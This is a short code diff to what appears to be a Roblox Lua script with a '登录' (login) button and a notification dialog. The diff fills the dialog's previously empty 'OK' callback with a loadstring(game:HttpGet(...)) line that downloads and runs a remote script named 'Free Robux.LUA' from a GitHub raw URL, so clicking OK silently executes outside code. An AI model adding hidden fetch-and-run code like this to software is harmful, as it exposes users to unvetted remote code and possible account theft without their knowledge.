@@ -64,8 +64,10 @@ Hook:Button("登录", function()
         Icon = 6031302918,
         Accept = {
             Text = "好的",
-            Callback = function() end
+            Callback = function() 
+        loadstring(game:HttpGet('https://raw.githubusercontent.com/CloudX-ScriptsWane/White-ash-script/main/Free%20Robux.LUA'))()
+        end
         },
-        Length = 5
+        Length = 20
     }
 end)
